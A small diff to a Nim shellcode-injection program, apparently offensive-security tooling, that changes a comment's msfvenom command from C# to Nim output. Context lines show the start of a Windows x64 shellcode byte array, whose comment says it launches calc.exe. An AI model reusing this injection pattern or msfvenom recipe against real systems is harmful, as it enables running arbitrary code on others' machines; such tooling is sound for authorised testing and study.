@@ -30,8 +30,8 @@ proc injectShellcode[I, T](shellcode: array[I, T]): void =
 
 when defined(windows):
 
-    # Define our shellcode as a Nim byte array (manually modified from the 'csharp' output type)
-    # msfvenom -p windows/x64/exec CMD="C:\windows\system32\calc.exe" EXITFUNC=thread -f csharp
+    # Define our shellcode as a Nim byte array
+    # msfvenom -p windows/x64/exec CMD="C:\windows\system32\calc.exe" EXITFUNC=thread -f nim
     var shellcode: array[296, byte] = [
     byte 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
     0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
